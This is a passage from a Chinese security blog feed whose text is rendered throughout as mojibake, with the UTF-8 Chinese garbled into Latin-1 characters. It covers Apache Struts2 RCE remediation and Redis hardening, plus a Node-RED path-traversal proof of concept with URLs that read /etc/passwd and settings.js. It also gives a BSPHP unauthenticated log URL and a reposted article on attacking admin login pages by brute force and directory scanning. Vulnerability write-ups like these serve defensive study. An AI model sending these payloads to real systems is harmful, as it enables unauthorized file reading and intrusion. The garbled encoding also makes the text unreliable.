é™¤uddiexploreræ–‡ä»¶å¤¹</p><p>ã€€ã€€2ã€é™åˆ¶uddiexploreråº”ç”¨åªèƒ½å†…ç½‘è®¿é—®</p><h2 id="32-Apache-Struts2-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-019ï¼‰"><a href="#32-Apache-Struts2-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-019ï¼‰" class="headerlink" title="32.Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-019ï¼‰"></a>32.Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-019ï¼‰</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€Apache Struts2çš„â€œDynamic MethodInvocationâ€æœºåˆ¶æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä»…æé†’ç”¨æˆ·å¦‚æœå¯èƒ½çš„æƒ…å†µä¸‹å…³é—­æ­¤æœºåˆ¶ï¼Œå¦‚æœæœªå…³é—­æ­¤æœºåˆ¶å°†å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´åœ¨å—å½±å“åº”ç”¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€ç›®å‰å‚å•†å·²ç»å‘å¸ƒäº†å‡çº§è¡¥ä¸ä»¥ä¿®å¤è¿™ä¸ªå®‰å…¨é—®é¢˜ï¼Œè¯·åˆ°å‚å•†çš„ä¸»é¡µä¸‹è½½ã€‚</p><p>ã€€ã€€2ã€æˆ–è€…æ‰‹å·¥è®¾ç½®struts.xmlæ–‡ä»¶&lt;constantname=â€struts.enable.DynamicMethodInvocationâ€value=â€falseâ€/&gt;</p><h2 id="33-Apache-Struts2-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-037ï¼‰"><a href="#33-Apache-Struts2-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-037ï¼‰" class="headerlink" title="33.Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-037ï¼‰"></a>33.Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-037ï¼‰</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€Apache Struts2åœ¨ä½¿ç”¨RESTæ’ä»¶æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡åŠ¨æ€æ–¹æ³•æ‰§è¡Œçš„é™åˆ¶ï¼Œè°ƒç”¨æ¶æ„è¡¨è¾¾å¼æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€å»ºè®®ç”¨æˆ·åˆ°å®˜æ–¹è·å–æœ€æ–°è¡¥ä¸æˆ–è€…æœ€æ–°ç‰ˆæœ¬ç¨‹åºã€‚</p><h2 id="34-Apache-Struts2-DevMode-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#34-Apache-Struts2-DevMode-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="34.Apache Struts2 DevMode è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>34.Apache Struts2 DevMode è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ä¸ºäº†ä¾¿äºå¼€å‘äººå‘˜è°ƒè¯•ç¨‹åºï¼ŒStruts2æä¾›äº†ä¸€ä¸ªdevModeæ¨¡å¼ï¼Œå¯ä»¥æ–¹ä¾¿æŸ¥çœ‹ç¨‹åºé”™è¯¯ä»¥åŠæ—¥å¿—ç­‰ä¿¡æ¯ã€‚å½“Struts2ä¸­çš„devModeæ¨¡å¼è®¾ç½®ä¸ºtrueæ—¶ï¼Œå­˜åœ¨ä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚å¦‚æœWebService å¯åŠ¨æƒé™ä¸ºæœ€é«˜æƒé™æ—¶ï¼Œå¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤ï¼ŒåŒ…æ‹¬å…³æœºã€å»ºç«‹æ–°ç”¨æˆ·ã€ä»¥åŠåˆ é™¤æœåŠ¡å™¨ä¸Šæ‰€æœ‰æ–‡ä»¶ç­‰ç­‰ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€å»ºè®®ç”¨æˆ·åˆ°å®˜æ–¹è·å–æœ€æ–°è¡¥ä¸æˆ–è€…æœ€æ–°ç‰ˆæœ¬ç¨‹åºã€‚</p><p>ã€€ã€€æˆ–è€…å°†struts.propertiesä¸­çš„devModeè®¾ç½®ä¸ºfalseï¼Œæˆ–æ˜¯åœ¨struts.xmlä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š &lt;constant name=â€struts.devModeâ€value=â€falseâ€/&gt;ã€‚</p><h2 id="35-Apache-Struts2-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-045ï¼‰"><a href="#35-Apache-Struts2-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-045ï¼‰" class="headerlink" title="35.Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-045ï¼‰"></a>35.Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-045ï¼‰</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€Apache Struts2çš„Jakarta Multipartparseræ’ä»¶å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´ç¼–å·ä¸ºCVE-2017-5638ã€‚æ”»å‡»è€…å¯ä»¥åœ¨ä½¿ç”¨è¯¥æ’ä»¶ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä¿®æ”¹HTTPè¯·æ±‚å¤´ä¸­çš„Content-Typeå€¼æ¥è§¦å‘è¯¥æ¼æ´ï¼Œå¯¼è‡´è¿œç¨‹æ‰§è¡Œä»£ç ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€æ£€æµ‹æ–¹å¼æŸ¥çœ‹webç›®å½•ä¸‹/WEB-INF/lib/ç›®å½•ä¸‹çš„struts-core.x.x.jar ï¼Œå¦‚æœè¿™ä¸ªç‰ˆæœ¬åœ¨Struts2.3.5 åˆ° Struts2.3.31 ä»¥åŠ Struts2.5 åˆ° Struts2.5.10ä¹‹é—´åˆ™å­˜åœ¨æ¼æ´ã€‚</p><p>ã€€ã€€1ã€å»ºè®®ç”¨æˆ·åˆ°å®˜æ–¹è·å–æœ€æ–°è¡¥ä¸æˆ–è€…æœ€æ–°ç‰ˆæœ¬ç¨‹åºã€‚</p><p>ã€€ã€€2ã€æ›´æ–°è‡³Strusts2.3.32æˆ–è€…Strusts2.5.10.1ï¼Œæˆ–ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„é˜²æŠ¤è®¾å¤‡è¿›è¡Œé˜²æŠ¤ã€‚</p><p>ã€€ã€€3ã€ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼šåˆ é™¤commons-fileupload-x.x.x.jaræ–‡ä»¶ï¼ˆä¼šé€ æˆä¸Šä¼ åŠŸèƒ½ä¸å¯ç”¨ï¼‰ã€‚</p><p>ã€€ã€€4ã€ä¿®æ”¹WEB-INF/classesç›®å½•ä¸‹çš„é…ç½®</p><p>ã€€ã€€åœ¨WEB-INF/classesç›®å½•ä¸‹çš„struts.xmlä¸­çš„struts æ ‡ç­¾ä¸‹æ·»åŠ </p><p>ã€€ã€€&lt;constantname=â€struts.custom.i18n.resourcesâ€value=â€globalâ€/&gt;ï¼›</p><p>ã€€ã€€åœ¨WEB-INF/classes/ç›®å½•ä¸‹æ·»åŠ global.propertiesï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹:</p><p>ã€€ã€€struts.messages.upload.error.InvalidContentTypeException=1</p><h2 id="36-Apache-Struts2-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-033ï¼‰"><a href="#36-Apache-Struts2-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-033ï¼‰" class="headerlink" title="36.Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-033ï¼‰"></a>36.Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-033ï¼‰</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€Apache Struts2åœ¨å¼€å¯åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼ˆDynamicMethod Invocationï¼‰çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…ä½¿ç”¨RESTæ’ä»¶è°ƒç”¨æ¶æ„è¡¨è¾¾å¼å¯ä»¥è¿œç¨‹æ‰§è¡Œä»£ç ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€ç”¨æˆ·åˆ°å®˜æ–¹è·å–æœ€æ–°è¡¥ä¸æˆ–è€…æœ€æ–°ç‰ˆæœ¬ç¨‹åºã€‚</p><p>ã€€ã€€2ã€æˆ–è€…åœ¨å…è®¸çš„æƒ…å†µä¸‹ç¦ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼ˆDynamic Method Invocationï¼‰ï¼Œä¿®æ”¹Struts2çš„é…ç½®æ–‡ä»¶struts.xmlï¼Œå°†struts.enable.DynamicMethodInvocationè®¾ç½®ä¸ºâ€œfalseâ€ã€‚</p><h2 id="37-redisç›¸å…³æ¼æ´ä¿®å¤"><a href="#37-redisç›¸å…³æ¼æ´ä¿®å¤" class="headerlink" title="37.redisç›¸å…³æ¼æ´ä¿®å¤"></a>37.redisç›¸å…³æ¼æ´ä¿®å¤</h2><p>è¡¥å……æ¥è‡ªåšå®¢å›­ï¼š@æ¢¦çŒ©é­‚</p><p>å®Œå–„æ¥è‡ªåšå®¢å›­ï¼š@æˆ‘è¶…æ€•çš„</p><p><strong>æ¼æ´æè¿°</strong></p><p>redisé»˜è®¤æ²¡æœ‰å£ä»¤å¯èƒ½ä¼šé€ æˆæœªæˆæƒè®¿é—®é€ æˆä¿¡æ¯æ³„éœ²ï¼Œè‹¥redisä¸ºé«˜æƒé™è´¦æˆ·è¿è¡Œï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨æƒé™ä¸¢å¤±ç­‰ã€‚</p><p><strong>å®‰å…¨å»ºè®®</strong></p><p>1.ç¦ç”¨ä¸€äº›é«˜å±å‘½ä»¤</p><p>ã€€ã€€å¸¸è§å¦‚ï¼šflushdbï¼Œflushallï¼Œconfigï¼Œkeys ç­‰</p><p>2.ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡</p><p>3.ä¸º Redis æ·»åŠ å¯†ç éªŒè¯</p><p>4.ç¦æ­¢å¤–ç½‘è®¿é—® Redis</p><p>5.ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨</p><p>ä¿—äººæ˜­æ˜­ï¼Œæˆ‘ç‹¬æ˜æ˜ã€‚ä¿—äººå¯Ÿå¯Ÿï¼Œæˆ‘ç‹¬é—·é—·ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ–‡æ¡£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node-RED ui_base ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</title>
      <link href="/2021/07/17/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Node-RED%20ui_base%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/17/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Node-RED%20ui_base%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Node-RED-ui-base-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"><a href="#Node-RED-ui-base-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="Node-RED ui_base ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"></a>Node-RED ui_base ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</h1><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>Node-RED åœ¨/nodes/ui_base.jsä¸­ï¼ŒURLä¸â€™/ui_base/js/*â€™åŒ¹é…ï¼Œç„¶åä¼ é€’ç»™path.joinï¼Œ</p><p>ç¼ºä¹å¯¹æœ€ç»ˆè·¯å¾„çš„éªŒè¯ä¼šå¯¼è‡´è·¯å¾„éå†æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ•°æ®ï¼Œæ¯”å¦‚settings.js</p><h2 id="æ¼æ´å½±å“"><a href="#æ¼æ´å½±å“" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h2><blockquote><p>[!NOTE]</p><p>Node-RED</p></blockquote><h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote><p>[!NOTE]</p><p>title=â€Node-REDâ€</p></blockquote><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è®¿é—®é¡µé¢</p><p><img src="https://img-blog.csdnimg.cn/img_convert/346971a9318cc350e4a2e701ae15460c.png" alt="image-20210701185722667"></p><p>éªŒè¯POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br><span class="line">/ui_base/js/..%2f..%2f..%2f..%2fsettings.js</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0b7ef8b4a6f8c62354d491da385c0da6.png" alt="image-20210701185812622"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7e922f160ad22a13c67e04b91230f150.png" alt="image-20210704171045540"></p>]]></content>
      
      
      <categories>
          
          <category> ä»»æ„æ–‡ä»¶è¯»å– </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BSPHPå­˜åœ¨æœªæˆæƒè®¿é—®</title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="BSPHPå­˜åœ¨æœªæˆæƒè®¿é—®"><a href="#BSPHPå­˜åœ¨æœªæˆæƒè®¿é—®" class="headerlink" title="BSPHPå­˜åœ¨æœªæˆæƒè®¿é—®"></a>BSPHPå­˜åœ¨æœªæˆæƒè®¿é—®</h1><p>è¯¥å¤„æ³„æ¼çš„â½¤æˆ·åå’Œç”¨æˆ·ç™»é™† IP</p><p>URLæ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¿›è¡Œè®¿é—®å³å¯è·å¾—å¦‚ä¸‹æ•°æ®</p><p><img src="./BSPHPå­˜åœ¨æœªæˆæƒè®¿é—®/wp_editor_md_90752b3880f4de0612a22c38542748d8.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åº“ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è°ˆè°ˆå¯¹åå°ç™»å½•é¡µé¢çš„æ¸—é€æµ‹è¯•</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¥æ˜¯æƒ³å†™æ¼æ´æ–‡ç« çš„ï¼Œä½†æ˜¯çœ‹è§è¿™ç¯‡æ–‡ç« ï¼Œè§‰å¾—è¿™ç¯‡æ–‡ç« å¯¹æ¸—é€ç»éªŒå°‘çš„äººå¯èƒ½ä¼šæœ‰ç‚¹å¸®åŠ©ï¼Œæ˜¯å¯ä»¥è®©æ–°æ‰‹æœ‰æ‰€æ”¶è·çš„æ–‡ç« ï¼Œæ‰€ä»¥æ”¾ä¸Šåšå®¢</p><h2 id="åŸæ–‡ï¼šè°ˆè°ˆå¯¹åå°ç™»å½•é¡µé¢çš„æ¸—é€æµ‹è¯•"><a href="#åŸæ–‡ï¼šè°ˆè°ˆå¯¹åå°ç™»å½•é¡µé¢çš„æ¸—é€æµ‹è¯•" class="headerlink" title="åŸæ–‡ï¼šè°ˆè°ˆå¯¹åå°ç™»å½•é¡µé¢çš„æ¸—é€æµ‹è¯•"></a>åŸæ–‡ï¼š<a href="https://www.anquanke.com/post/id/185426" target="_blank" rel="noopener">è°ˆè°ˆå¯¹åå°ç™»å½•é¡µé¢çš„æ¸—é€æµ‹è¯•</a></h2><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ‰äº›æœ‹å‹åœ¨æ¸—é€æ—¶æ‰«æåˆ°åå°ç™»é™†ç•Œé¢ï¼Œå´ä¸çŸ¥é“å¦‚ä½•å…¥æ‰‹ã€‚æœ€è¿‘åˆšå¥½åœ¨æŸå…¬å¸åšæ¸—é€å®ä¹ ï¼Œå¯¹ç›®æ ‡å›ºå®šçš„ç³»ç»Ÿæ¸—é€æœ‰äº›ä½“ä¼šã€‚å› æ­¤è¿™é‡Œè®²ä¸€ä¸‹å¯¹ç½‘ç«™åå°ç™»é™†ç•Œé¢çš„æ¸—é€æ€è·¯ï¼Œå¸Œæœ›èƒ½ä¸ºå¤§å®¶æä¾›ä¸€äº›å¸®åŠ©ã€‚</p><h2 id="0x01-å¼€å§‹"><a href="#0x01-å¼€å§‹" class="headerlink" title="0x01 å¼€å§‹"></a>0x01 å¼€å§‹</h2><p>æœ¬äººåœ¨è¿›å…¥ç™»é™†ç•Œé¢æ—¶ï¼Œä¸€èˆ¬éƒ½æ˜¯å…ˆç”¨ä¸‡èƒ½å¯†ç ä»€ä¹ˆçš„æµ‹ä¸‹è¾“å…¥æ¡†æœ‰æ²¡æœ‰æ³¨å…¥ï¼ˆç°åœ¨å¾ˆå°‘è§äº†ï¼‰ã€‚å¦‚æœæ²¡æœ‰ï¼Œé‚£å°±å…ˆæ‹¿adminï¼Œ123456ä»€ä¹ˆçš„æµ‹è¯•ä¸‹å¼±å£ä»¤ï¼Œä¸æ±‚è¿æ°”çˆ†æ£šä¸€ä¸‹å°±çŒœåˆ°å¯†ç ã€‚ä¸»è¦æ˜¯çœ‹ä¸‹å›æ˜¾ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨è´¦å·é”å®šç­–ç•¥ï¼Œå¯†ç ä¸æ­£ç¡®ï¼Œä¸å­˜åœ¨æ­¤ç”¨æˆ·åç­‰ä¿¡æ¯ï¼Œä»¥ä¾¿äºå°è¯•éå†å¯èƒ½å­˜åœ¨çš„ç”¨æˆ·åã€‚æ²¡éªŒè¯ç å°±ä¸Šçˆ†ç ´å·¥å…·ï¼Œæœ‰éªŒè¯ç çš„è¯çœ‹çœ‹èƒ½ä¸èƒ½ç»•è¿‡,å®åœ¨ä¸è¡Œæ‰‹å·¥æµ‹å‡ ä¸ªè´¦å·å¯†ç ç¢°ç¢°è¿æ°”ã€‚</p><h2 id="0x02-çˆ†ç ´"><a href="#0x02-çˆ†ç ´" class="headerlink" title="0x02 çˆ†ç ´"></a>0x02 çˆ†ç ´</h2><p>å¦‚æœæ²¡éªŒè¯ç é˜»ç¢ï¼Œé‚£çˆ†ç ´æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæ‹¿ä¸ªå¥½å­—å…¸ï¼Œç›´æ¥å¹²å°±æ˜¯äº†ã€‚</p><p>ä¸è¿‡æ³¨æ„ä¸‹æœ‰æ—¶å¯†ç ä¼ è¾“ä¼šä½¿ç”¨md5æˆ–è€…base64ä¹‹ç±»çš„åŠ å¯†ï¼Œè¿™æ—¶é™¤äº†è‡ªå·±å†™è„šæœ¬å¤–ï¼Œå¯ä»¥ä½¿ç”¨burpsuiteçš„intruderæ¨¡å—<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6thmeqhnfj30v10l2tap.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6thmw22wqj30uk0bxdgp.jpg" alt><br>çˆ†ç ´çš„ä¼ ç»Ÿæ€è·¯éƒ½æ˜¯å›ºå®šè´¦å·çˆ†ç ´å¯†ç ï¼Œè¿˜æœ‰ä¸€ç§å§¿åŠ¿æ˜¯å›ºå®šå¯†ç çˆ†ç ´ç”¨æˆ·åã€‚æ¯”å¦‚ä½¿ç”¨å›ºå®šå¯†ç 123456ï¼Œçˆ†ç ´å¸¸ç”¨ç”¨æˆ·åæˆ–è€…å¸¸ç”¨äººåæ‹¼éŸ³ã€‚</p><h2 id="0x03-æ‰«ç›®å½•"><a href="#0x03-æ‰«ç›®å½•" class="headerlink" title="0x03 æ‰«ç›®å½•"></a>0x03 æ‰«ç›®å½•</h2><p>ç›®å½•æ‰«æä¹Ÿæ˜¯ä¸€ä¸ªå­˜åœ¨æƒŠå–œçš„åœ°æ–¹ï¼Œè¯´ä¸å®šèƒ½æ‰«æåˆ°åå°æœªæˆæƒè®¿é—®çš„é“¾æ¥ã€å¤‡ä»½æ–‡ä»¶ã€ç¼–è¾‘å™¨ã€æ•æ„Ÿä¿¡æ¯ç­‰ã€‚</p><p>åƒåå°ç™»é™†çš„ç½‘å€çœ‹å¤šäº†ï¼Œå¸¸è§„çš„è·¯å¾„åƒ<a href="http://www.xxx.com/admin/login.aspx(.php)" target="_blank" rel="noopener">www.xxx.com/admin/login.aspx(.php)</a></p><p>è€å¸æœºç”šè‡³ä¸ç”¨å¾¡å‰‘ä»€ä¹ˆçš„å·¥å…·è·‘ï¼Œå°±èƒ½ç›´æ¥çŒœåˆ°ã€‚</p><p>ä¸€èˆ¬ç¢°åˆ°ä¸‹é¢è¿™ç§æƒ…å†µï¼Œå¯é‡‡ç”¨fuzzå¤§æ³•ã€‚ä¸€å±‚ä¸€å±‚fuzzï¼Œå°è¯•å¯»æ‰¾å¯åˆ©ç”¨çš„ä¿¡æ¯ã€‚æ¼æ´é“¶è¡Œæœ‰ä¸€æœŸè¡¬è¡«çš„è§†é¢‘fuzzè®²å¾—å¾ˆå¥½ã€‚ä»–ç”¨çš„å·¥å…·æ˜¯wfuzzï¼Œæ„Ÿè§‰ä¸é”™ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹çœ‹ã€‚<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6thndmouej30up0ekgnf.jpg" alt><br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thno21asj30tt0f1abo.jpg" alt></p><p><strong>è¿™é‡Œç»™å¤§å®¶è®²ä¸€ä¸‹æˆ‘åšæˆæƒæ¸—é€çš„ä¸€ä¸ªæ¡ˆåˆ—:</strong></p><p>ä¸€èˆ¬ç»™å®¢æˆ·çš„åå°ç³»ç»Ÿåšæ¸—é€ï¼Œå®¢æˆ·éƒ½ä¼šç»™ä¸ªæµ‹è¯•è´¦å·ï¼Œé™¤äº†æµ‹ç™»é™†ç•Œé¢å¤–ï¼Œè¿˜æµ‹ä¸‹åå°çš„åŠŸèƒ½æ¨¡å—ã€‚ä½†è¿™æ¬¡å½“æˆ‘é—®å®¢æˆ·è¦è´¦å·å¯†ç æ—¶ï¼Œå®¢æˆ·å›ï¼šä½ ä»¬ä¸æ˜¯è¦æ¨¡æ‹Ÿé»‘å®¢åšæ¸—é€æµ‹è¯•å—ï¼Œé‚£å°±è‡ªå·±æ‰“è¿›å»å•Šã€‚( â•¯â–¡â•° )å¥½å§ï¼Œä½œä¸ºå®ä¹ ç”Ÿçš„æˆ‘ä¹Ÿåªèƒ½ç¡¬ç€å¤´çš®åˆšç™»é™†ç•Œé¢äº†ã€‚</p><p>å…ˆçœ‹äº†ä¸‹é“¾æ¥ï¼Œå‘ç°æ˜¯Javaç«™ï¼Œä¸”é“¾æ¥æ˜¯.doç»“å°¾ï¼Œä½†struct2å·¥å…·è¯•äº†ä¸‹æ²¡æˆåŠŸã€‚<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tho3of7mj30uj08bgmz.jpg" alt><br>çœ‹äº†ä¸‹ç™»é™†ç•Œé¢ï¼Œæœ‰éªŒè¯ç ï¼Œç½‘ç«™çœ‹å»çš„ç‰ˆæœ¬ä¹ŸæŒºæ–°çš„ï¼Œæ„Ÿè§‰ä¸å¤ªå¥½æã€‚<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thoghp6aj30if096t9c.jpg" alt><br>æµ‹ä¸‹æ³¨å…¥æ— æœï¼Œäºæ˜¯æŠ“åŒ…çœ‹ä¸‹éªŒè¯ç æ˜¯å¦å¯ä»¥ç»•è¿‡æˆ–è€…ä¸å˜ï¼Œç»“æœè¿™ä¸ªéªŒè¯ç å¾ˆç§°èŒï¼Œçˆ†ç ´ä¸äº†ã€‚éªŒè¯ç è¾¨è®¤è¿˜ç®—æ¸…æ¥šï¼Œä¸è¿‡éªŒè¯ç è¯†åˆ«ï¼Œæ€»è§‰å¾—ä¸å¤ªé è°±ã€‚ã€‚ã€‚ç­‰ç»æœ›äº†æ‰¾ä¸åˆ°æ´å†è¯•å§ã€‚äºæ˜¯å»æ‰«äº†ä¸‹ç›®å½•ã€‚è¯¶ï¼Œå‘ç°æœ‰å¥½ä¸œè¥¿ã€‚<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thovfgsjj30au087767.jpg" alt><br>é¦–å…ˆæ‰«åˆ°äº†ä¸€ä¸ªservicesæœåŠ¡è·¯å¾„<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thpfty87j30u10d276h.jpg" alt><br>çŸ¥é“äº†Apache Axisç»„ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯<br><img src="https://imgchr.com/i/ntKnXQ" alt><br>ç„¶åé©¬ä¸Šæƒ³åˆ°è¿™ä¸ªç»„ä»¶å½“æ—¶åˆšçˆ†å‡ºä¸€ä¸ªRCEæ¼æ´</p><p>pocé“¾æ¥ï¼š<a href="https://github.com/KibodWapon/Axis-1.4-RCE-Poc" target="_blank" rel="noopener">https://github.com/KibodWapon/Axis-1.4-RCE-Poc</a></p><p>ç»“æœè¯•äº†ä¸‹æ²¡æˆåŠŸã€‚ç„¶åå†å°è¯•äº†å››æœˆä»½CNVDçœ‹åˆ°çš„RCEæ¼æ´ä¹Ÿæ— æœã€‚</p><p>è¿˜æ‰«å‡ºäº†ä¸€ä¸ªckfinderç¼–è¾‘å™¨<br><a href="http://xxx.xxx.com/ckfinder/ckfinder.html" target="_blank" rel="noopener">http://xxx.xxx.com/ckfinder/ckfinder.html</a></p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4gao3lj30ty0cqwg5.jpg" alt><br>ä¸€çœ‹ï¼Œæˆ‘æ»´ä¹–ä¹–ï¼Œéš¾é“å·²ç»æœ‰é»‘å®¢æè¿›å»äº†ï¼Ÿ</p><p>èµ¶ç´§ç½‘ä¸Šæ‰¾äº†ä¸‹è¿™ä¸ªç‰ˆæœ¬æœ‰å­˜åœ¨ä»€ä¹ˆæ¼æ´ï¼Œå¹¶å°è¯•æ–‡ä»¶ä¸Šä¼ 